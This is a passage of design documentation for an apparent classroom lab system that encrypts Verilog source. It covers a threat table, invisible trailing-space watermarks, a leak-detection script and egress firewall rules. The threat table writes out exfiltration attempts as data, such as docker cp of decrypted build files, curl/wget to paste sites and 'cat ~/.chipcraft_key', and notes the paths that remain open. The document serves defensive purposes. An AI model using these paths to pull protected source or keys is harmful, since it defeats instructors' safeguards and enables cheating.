| **git push decrypted files** from `~/lab/build/` | Blocked | `build/` is inside `~/lab` so the wrapper's "outside ~/lab" check doesn't apply here — instead `.gitignore` silently ignores plain `.v` files, and the pre-commit hook blocks any non-`.enc` add even with `-f` |
| **git init** anywhere | Blocked | git wrapper blocks `git init` everywhere |
| **git clone** to push to a private repo | Blocked | git wrapper blocks `git clone` everywhere |
| **curl / wget** to paste sites | Blocked | Egress firewall — only GitHub IPs allowed |
| **Browser inside VNC** to Google Drive, email | Blocked | Egress firewall |
| **`docker inspect`** to see CHIPCRAFT_KEY | Not possible | Key delivered via Cloudflare Worker — never an env var in the container |
| **`echo $CLASS_TOKEN`** | Visible | CLASS_TOKEN is a door pass, not the key — harmless |
| **`docker cp ~/lab/*.enc`** | Blocked | Ciphertext only — useless without the key |
| **`docker cp ~/lab/build/counter.v`** (simple lab, via `make`) | Blocked (almost always) | No plaintext `.v` file exists there except for the few seconds a `make` is actively compiling |
| **`docker cp ~/lab/build/tarang2_dp1/...`** (multi-file projects) | **Not blocked — by design** | `chipcraft-decrypt-all.sh` decrypts this persistently for the whole session (deliberate tradeoff, see "Multi-file projects" above). Real plaintext source, readable at any time. |
| **`vi test.v`** / **`gvim test.v`** | Blocked | `vi`/`vim`/`gvim` are wrappers — redirect `*.v` args to `*.v.enc`. No `.v` file is ever created. |
| **`touch test.v`** in WORK or BUILD | Blocked (within seconds) | `chipcraft-sweep.sh` detects it and encrypts (WORK) or encrypts+locks (BUILD) |
| **`cp`/`mv`/`docker cp` dropping `.v` into WORK or BUILD** | Blocked (within seconds) | Sweep auto-encrypts to WORK, leaves read-only copy in BUILD |
| **`cat ~/.chipcraft_key`** | Not possible to block | Same Linux user as gvim — see note in the key-delivery table above |
| **Phone photo / screen recording** | Cannot block | Watermark identifies the student |
| **Manual typing** the code | Cannot block | Watermark + academic integrity policy |

---

## Watermarking — Tracing Leaked Files

Every decrypted `.v` file receives two watermarks automatically.
The student's GitHub username (from `GITHUB_USER` env var) is embedded uniquely
per container — no manual step needed.

### Visible watermark (decoy)

```verilog
// [ChipCraft] Student: @john_student | 2026-06-19
module counter #( ...
```

### Invisible watermark (real trap)

The student's GitHub username is encoded as **binary bits into trailing spaces**
on each line — completely invisible to readers and most editors. When the student
deletes the visible comment, the invisible watermark is still present.

### How to detect a leaked file (teacher tool)

```bash
export CHIPCRAFT_KEY="your-secret-key"

bash NVR/tools/detect_leak.sh leaked_counter.v
# -> Leaked file : leaked_counter.v
# -> Student     : @john_student

bash NVR/tools/detect_leak.sh counter.v.enc    # auto-decrypts first
```

---

## Egress Firewall

Each student container starts with iptables rules blocking all outbound traffic:

```
ALLOWED outbound:
  +-- Loopback (127.0.0.1)
  +-- Docker internal network (172.x, 10.x)   <- API key delivery (Server Mode)
  +-- DNS (port 53)
  +-- GitHub IP ranges (port 443 / 22)        <- git push only

BLOCKED outbound:
  +-- Everything else — paste sites, email, file sharing, cloud storage
```

---

## Security Summary

```
CHIPCRAFT_KEY journey (Codespace / Local Docker):
  Cloudflare Worker secrets (teacher access only)
    -> POST /worker (CLASS_TOKEN validated, CHIPCRAFT_KEY returned in response)
      -> bash variable in chipcraft-key-init.sh (~2 seconds)
        -> written to ~/.chipcraft_key (mode 600)  ->  read by gvim plugin per file

CHIPCRAFT_KEY journey (Server Mode):
  .env (server — teacher access only)
    -> API memory
      -> POST /lab-key (internal network, one-time token, 30s TTL)
        -> bash variable in chipcraft-key-init.sh
          -> written to ~/.chipcraft_key (mode 600)  ->  read by gvim plugin per file

CLASS_TOKEN (Codespace / Local Docker):
  Visible in student environment.
  It is a door pass, not the encryption key.
  Students can see it but cannot use it to obtain CHIPCRAFT_KEY directly.
  The Cloudflare Worker validates it but never exposes the key elsewhere.

Decrypted .v content while editing:
  Exists only inside gvim's buffer (openssl pipe in, openssl pipe out on :w)
  No plaintext file written, ever  ->  swapfile/backup/undofile disabled too

Decrypted .v files while compiling (simple lab, e.g. counter.v):
  ~/lab/build/ (tmpfs, RAM only)  ->  exists only for the duration of one `make`
  call  ->  shredded the moment iverilog exits, success or failure

Decrypted source for multi-file projects (e.g. tarang2_dp1):
  ~/lab/build/ (tmpfs, RAM only)  ->  decrypted once at startup by
  chipcraft-decrypt-all.sh  ->  persists for the WHOLE session, not shredded
  ->  DELIBERATE TRADEOFF: docker cp / terminal / any filesystem access can
  read this at any time during the session — chosen to remove session-
  management friction for multi-file build flows. chipcraft-tree (session-
  scoped decrypt/shred) remains available for anyone who wants the narrower
  exposure window instead.

Encrypted .v.enc files:
  chipcraft-lab-files repo + ~/lab/ volume  ->  safe anywhere  ->  useless without key

Git operations:
  /usr/local/bin/git (wrapper) blocks init/clone everywhere
  and blocks add/commit/push outside ~/lab/
  Internal tools use /usr/bin/git directly — unaffected

If a file leaks:
  detect_leak.sh  ->  reads invisible trailing-space watermark  ->  names the student
```
